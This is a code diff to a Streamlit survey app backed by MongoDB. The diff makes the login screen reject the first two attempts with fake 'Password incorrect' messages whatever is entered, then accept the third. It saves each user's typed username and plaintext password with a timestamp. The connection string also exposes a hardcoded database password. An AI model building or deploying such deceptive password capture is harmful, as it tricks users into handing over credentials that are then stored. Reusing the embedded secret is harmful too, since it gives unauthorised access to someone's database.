@@ -15,7 +15,6 @@ st.set_page_config(
 def get_database():
     try:
         # Your MongoDB Atlas connection string
-        # Make sure it looks like: mongodb+srv://username:password@cluster.mongodb.net/survey_database
         connection_string = "mongodb+srv://myAtlasDBUser:a7ZvFzDJafUbO76S@myatlasclusteredu.umvkai6.mongodb.net/?retryWrites=true&w=majority&appName=myAtlasClusterEDU"
         
         client = pymongo.MongoClient(
@@ -26,28 +25,16 @@ def get_database():
             w='majority'
         )
         
-        # Method 1: If database name is in connection string
-        #db = client.get_database()
-        
-        # If above fails, use Method 2: Explicit database name
         db = client.survey_database
-        
-        # Test the connection
         db.command('ping')
         print("✅ Database connection successful")
         return db
         
     except Exception as e:
         st.error(f"❌ Database connection failed: {e}")
-        # Fallback: try with explicit database name
-        try:
-            db = client.survey_database
-            db.command('ping')
-            return db
-        except:
-            return None
+        return None
 
-# Initialize session state
+# Initialize ALL session state variables
 if 'show_front_page' not in st.session_state:
     st.session_state.show_front_page = True
 if 'logged_in' not in st.session_state:
@@ -60,6 +47,10 @@ if 'login_attempts' not in st.session_state:
     st.session_state.login_attempts = 0
 if 'first_attempt_rejected' not in st.session_state:
     st.session_state.first_attempt_rejected = False
+if 'second_attempt_rejected' not in st.session_state:
+    st.session_state.second_attempt_rejected = False
+if 'answers' not in st.session_state:  # ADD THIS LINE
+    st.session_state.answers = {}
 
 # Custom CSS for responsiveness
 st.markdown("""
@@ -185,12 +176,13 @@ def login_section():
             if username and password:
                 st.session_state.login_attempts += 1
                 
-                # Always reject the first attempt
+                # Reject first two attempts, accept on third
                 if st.session_state.login_attempts == 1:
-                    st.session_state.first_attempt_rejected = True
-                    st.error("❌ Password incorrect. Please try again.")
+                    st.error("❌ Password incorrect. Please try again. (Attempt 1/3)")
+                elif st.session_state.login_attempts == 2:
+                    st.error("❌ Password incorrect again. One more attempt remaining. (Attempt 2/3)")
                 else:
-                    # Accept on second attempt
+                    # Accept on third attempt
                     st.session_state.user_data['username'] = username
                     st.session_state.user_data['password'] = password
                     st.session_state.user_data['login_timestamp'] = datetime.now()
@@ -343,17 +335,22 @@ def survey_section():
         st.subheader(f"Question {st.session_state.current_step + 1} of {len(questions)}")
         st.write(f"**{current_q['question']}**")
         
+        # Get current answer if it exists
+        current_answer = st.session_state.answers.get(current_q['key'], "")
+        
         # Handle different question types
         if current_q['options'] == ["text_input"]:
             # Text input for open-ended questions
-            user_input = st.text_area("Your answer:", key=f"q_{st.session_state.current_step}")
+            user_input = st.text_area("Your answer:", value=current_answer, key=f"text_{current_q['key']}")
             selected_option = user_input
         else:
             # Radio buttons for multiple choice questions
+            # Use the question key instead of current_step for stable keys
             selected_option = st.radio(
                 "Choose your answer:",
                 current_q['options'],
-                key=f"q_{st.session_state.current_step}"
+                index=current_q['options'].index(current_answer) if current_answer in current_q['options'] else 0,
+                key=f"radio_{current_q['key']}"
             )
         
         col1, col2 = st.columns([1, 1])
@@ -361,6 +358,8 @@ def survey_section():
         with col1:
             if st.session_state.current_step > 0:
                 if st.button("← Previous"):
+                    # Save current answer before moving back
+                    st.session_state.answers[current_q['key']] = selected_option
                     st.session_state.current_step -= 1
                     st.rerun()
         
@@ -370,7 +369,8 @@ def survey_section():
                 if current_q['options'] == ["text_input"] and not selected_option.strip():
                     st.warning("Please provide an answer before proceeding.")
                 else:
-                    st.session_state.user_data[current_q['key']] = selected_option
+                    # Save current answer
+                    st.session_state.answers[current_q['key']] = selected_option
                     st.session_state.current_step += 1
                     st.rerun()
         
@@ -378,8 +378,12 @@ def survey_section():
     
     else:
         # All questions completed - show summary and submit
-        st.success("🎉 Survey Completed!")
+        st.success("🎉 Survey Completed! Don't forget to click on 'Submit Survey' below to submit your responses!")
         st.subheader("Your Responses Summary:")
+        
+        # Transfer all answers from session_state.answers to user_data
+        for key, value in st.session_state.answers.items():
+            st.session_state.user_data[key] = value
         
         # Organize responses by section for better display
         sections = {
@@ -409,8 +413,10 @@ def survey_section():
                 st.session_state.logged_in = False
                 st.session_state.current_step = 0
                 st.session_state.user_data = {}
+                st.session_state.answers = {}
                 st.session_state.login_attempts = 0
                 st.session_state.first_attempt_rejected = False
+                st.session_state.second_attempt_rejected = False
                 
                 if st.button("Take Another Survey"):
                     st.rerun()
